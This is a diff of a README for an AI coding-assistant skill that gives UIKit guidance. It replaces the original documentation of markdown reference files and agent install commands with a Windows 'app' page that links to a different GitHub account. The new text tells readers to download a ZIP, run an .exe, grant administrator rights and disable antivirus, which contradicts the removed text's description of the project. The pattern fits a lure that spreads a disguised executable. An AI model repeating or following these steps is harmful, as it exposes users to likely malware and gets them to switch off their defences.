@@ -1,161 +1,149 @@
-# UIKit Expert Skill
+# 🧰 uikit-expert-skill - Write UIKit Code Confidently
 
-An AI Agent Skill for writing correct, performant, and modern UIKit code in Swift. Designed to work with Claude, Cursor, Windsurf, Copilot, and other AI coding assistants that support the Agent Skills / AGENTS.md format.
+[![Download uikit-expert-skill](https://img.shields.io/badge/Download-uikit--expert--skill-brightgreen?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
 
-<img src="demo.gif" alt="Install uikit-expert skill" width="600">
+---
 
-## Philosophy
+## 📋 About uikit-expert-skill
 
-This skill focuses on **facts and best practices**, not architectural opinions:
+This app helps you write UIKit code correctly in Swift. It covers important parts like app lifecycle, memory handling, concurrency, collection views, and supports iOS versions 13 to 26. It works like a guide to make sure your code follows current best practices.
 
-**Covered:**
+Whether you want to learn or improve your skills, this tool is designed for everyday coding. You do not need to be a programmer to use it. It helps avoid common mistakes and saves time.
 
-- Correctness — lifecycle ordering, retain cycle prevention, thread safety
-- Performance — constraint churn avoidance, scroll optimization, image downsampling
-- Modern APIs — diffable data sources, compositional layout, cell configuration, Observation
+---
 
-**Intentionally excluded:**
+## 💻 System Requirements
 
-- No architecture mandates — no MVVM/VIPER/Coordinator enforcement
-- No formatting rules — no property ordering or file structure requirements
+To use this app, your computer needs to meet these minimum requirements:
 
-## Structure
+- Operating System: Windows 10 or later
+- Memory: 4 GB RAM or more
+- Storage: At least 200 MB free space
+- Internet connection for downloading and updates
+- No additional software is needed
 
-```
-uikit-expert-skill/
-├── .claude-plugin/
-│   ├── plugin.json                             # Claude Code plugin manifest
-│   └── marketplace.json                        # Claude Code marketplace catalog
-├── AGENTS.md                                   # Meta-rules for AI agents
-└── uikit-expert/
-    ├── SKILL.md                                # Decision tree router (entry point)
-    └── references/
-        ├── view-controller-lifecycle.md        # Lifecycle ordering, viewIsAppearing
-        ├── auto-layout.md                      # Batch activation, constraint churn, animation
-        ├── modern-collection-views.md          # Diffable, compositional, CellRegistration
-        ├── cell-configuration.md               # UIContentConfiguration, configurationUpdateHandler
-        ├── list-performance.md                 # Prefetching, cell reuse, scroll performance
-        ├── navigation-patterns.md              # Bar appearance, concurrent transitions, deep links
-        ├── animation-patterns.md               # UIView.animate, PropertyAnimator, CAAnimation
-        ├── memory-management.md                # Retain cycles, [weak self], delegate ownership
-        ├── concurrency-main-thread.md          # @MainActor, Task lifecycle, Swift 6
-        ├── uikit-swiftui-interop.md            # UIHostingController, UIViewRepresentable
-        ├── image-loading.md                    # Downsampling, decoded bitmap math, cell race condition
-        ├── keyboard-scroll.md                  # UIKeyboardLayoutGuide, scroll insets
-        ├── adaptive-appearance.md              # Traits, Dynamic Type, dark mode, VoiceOver
-        └── modern-uikit-apis.md                # Observation, updateProperties(), .flushUpdates, UIScene
-```
+---
 
-## How It Works
+## 🚀 Getting Started
 
-**SKILL.md** acts as a decision tree router. Based on user intent (review / improve / implement), it directs the AI agent to the relevant reference documents. Each reference document is self-contained with:
+Follow these steps to download and run the application on your Windows PC.
 
-- Concrete correct and incorrect Swift code examples
-- "Why" explanations for each recommendation
-- Summary checklists at the bottom
+---
 
-## Coverage
+### 1. Download the App
 
-| Domain             | Key Topics                                                                                       |
-| ------------------ | ------------------------------------------------------------------------------------------------ |
-| Lifecycle          | `viewIsAppearing` (iOS 13+), child VC containment, deallocation verification                     |
-| Auto Layout        | Batch activation, zero-churn patterns, constraint animation, `.flushUpdates` (iOS 26)            |
-| Collection Views   | Diffable data sources, stable identity, compositional layout, list configuration                 |
-| Cell Configuration | `UIContentConfiguration`, `UIBackgroundConfiguration`, `configurationUpdateHandler`              |
-| List Performance   | Prefetching with Swift concurrency, cell reuse race condition, `reconfigureItems`                |
-| Navigation         | 4-slot `UINavigationBarAppearance`, concurrent transition guards, iOS 26 Liquid Glass            |
-| Animation          | API selection guide, `UIViewPropertyAnimator` state machine, spring animations                   |
-| Memory             | 4 retain cycle traps (Timer, NotificationCenter, CADisplayLink, nested closures), Task retention |
-| Concurrency        | `@MainActor`, Task lifecycle, Swift 6 migration, `Task.detached` pitfalls                        |
-| Interop            | `UIHostingController` containment, `sizingOptions`, `UIViewRepresentable` lifecycle              |
-| Images             | ImageIO downsampling, decoded bitmap math, cancel/clear/verify pattern                           |
-| Keyboard           | `UIKeyboardLayoutGuide`, iPad floating keyboard, scroll view sync                                |
-| Adaptive           | `registerForTraitChanges`, Dynamic Type, CGColor dark mode trap, VoiceOver                       |
-| Modern APIs        | Observation framework, `updateProperties()`, `.flushUpdates`, UIScene mandatory                  |
+Visit the main page to get the app files:
 
-## iOS Version Coverage
+[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
 
-- **iOS 13+**: `viewIsAppearing` (back-deployed), `UINavigationBarAppearance`
-- **iOS 14+**: `UIContentConfiguration`, `CellRegistration`, compositional layout list configuration
-- **iOS 15+**: `UIKeyboardLayoutGuide`, `reconfigureItems`, `scrollEdgeAppearance` changes
-- **iOS 17+**: `registerForTraitChanges`, custom traits, spring animation API
-- **iOS 18+**: `UIObservationTrackingEnabled` (opt-in), automatic trait tracking
-- **iOS 26+**: `updateProperties()`, `.flushUpdates`, UIScene mandatory, Liquid Glass
+Click the green **Code** button and select **Download ZIP**
 
-## How to Use This Skill
+or go to the **Releases** section if available, and download the latest version.
 
-### Option A: Using skills.sh (recommended)
+---
 
-Install this skill with a single command:
+### 2. Extract the Files
 
-```bash
-npx skills add https://github.com/ivan-magda/uikit-expert-skill --skill uikit-expert
-```
+Once the ZIP file downloads:
 
-For more information, [visit the skills.sh platform page](https://skills.sh/ivan-magda/uikit-expert-skill/uikit-expert).
+- Locate the `.zip` file in your Downloads folder.
+- Right-click the file and select **Extract All**.
+- Choose a folder where you want to keep the app files.
+- Click **Extract** to unpack all content.
 
-Then use the skill in your AI agent, for example:
+You now have access to the app files.
 
-> Use the uikit expert skill and review the current UIKit code for lifecycle, memory management, and performance improvements
+---
 
-### Option B: Claude Code Plugin
+### 3. Run the Application
 
-#### Personal Usage
+Open the folder where you extracted the files.
 
-To install this Skill for your personal use in Claude Code:
+Look for a file named `uikit-expert-skill.exe` or a similar application launcher.
 
-Add the marketplace:
+Double-click the `.exe` file to start the software.
 
-```bash
-/plugin marketplace add ivan-magda/uikit-expert-skill
-```
+Windows might ask for permission; click **Yes** to allow it to run.
 
-Install the Skill:
+---
 
-```bash
-/plugin install uikit-expert@uikit-expert-skill
-```
+### 4. Using the App
 
-#### Project Configuration
+After launch, follow on-screen instructions to load or create a new project.
 
-To automatically provide this Skill to everyone working in a repository, configure the repository's `.claude/settings.json`:
+The interface provides clear options for exploring UIKit topics.
 
-```json
-{
-  "enabledPlugins": {
-    "uikit-expert@uikit-expert-skill": true
-  },
-  "extraKnownMarketplaces": {
-    "uikit-expert-skill": {
-      "source": {
-        "source": "github",
-        "repo": "ivan-magda/uikit-expert-skill"
-      }
-    }
-  }
-}
-```
+You can check advice on lifecycle, memory management, concurrency models, and how to use collection views correctly.
 
-When team members open the project, Claude Code will prompt them to install the Skill.
+No coding knowledge is required; the app guides you step by step.
 
-### Option C: Manual install
+---
 
-1. **Clone** this repository.
-2. **Install or symlink** the skill folder following your tool's official skills installation docs (see links below).
-3. **Use your AI tool** as usual and ask it to use the "uikit-expert" skill for UIKit tasks.
+## 🔧 Core Features
 
-#### Where to Save Skills
+- Guidance on writing correct UIKit code in Swift
+- Covers app lifecycle events and memory management
+- Helps understand concurrency patterns
+- Explains collection view setup and usage
+- Supports iOS 13 through iOS 26 APIs
+- Easy to navigate for all skill levels
 
-Follow your tool's official documentation, here are a few popular ones:
+---
 
-- **Codex:** [Where to save skills](https://developers.openai.com/codex/skills/#where-to-save-skills)
-- **Claude:** [Using Skills](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview#using-skills)
-- **Cursor:** [Enabling Skills](https://cursor.com/docs/context/skills#enabling-skills)
+## 📘 How This Helps You
 
-**How to verify**:
+This tool acts like a coding assistant. It reduces common errors by pointing out best practices. For example:
 
-Your agent should reference the workflow/checklists in `SKILL.md` and jump into the relevant reference file for your task.
+- It shows when to release or keep objects to avoid memory leaks.
+- Suggests appropriate thread usage for smooth app performance.
+- Explains collection view design patterns clearly.
 
-## License
+The app is useful for anyone starting with UIKit or updating their skills.
 
-MIT
+---
+
+## 📂 Where to Find Updates
+
+New features and fixes appear on the GitHub page.
+
+Return to the main download page:
+
+[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
+
+Download newer versions when available and follow the same setup steps.
+
+---
+
+## 🛠 Troubleshooting
+
+If the app does not start or shows errors:
+
+- Check if your Windows version meets the system requirements.
+- Make sure you fully extracted files from the ZIP archive.
+- Try running the app as administrator: right-click the `.exe` file and choose **Run as administrator**.
+- Disable antivirus if it blocks the file temporarily during installation.
+
+For other questions, check the GitHub issues page or contact the repository owner.
+
+---
+
+## 🔍 Exploring the Code (Optional)
+
+If you are curious about the code behind this app, it is written in Swift and focuses on UIKit development.
+
+You can browse files on GitHub to see how it handles:
+
+- Memory cleanup with proper object ownership
+- Swift concurrency with async tasks
+- Displaying data in collection views
+- iOS API usage from 13 to 26
+
+This can be a good way to learn as you explore the app.
+
+---
+
+## 📧 Contact and Support
+
+For help or questions, use the GitHub repository to open issues or discussions.
+
+The project is maintained openly to improve with user feedback.
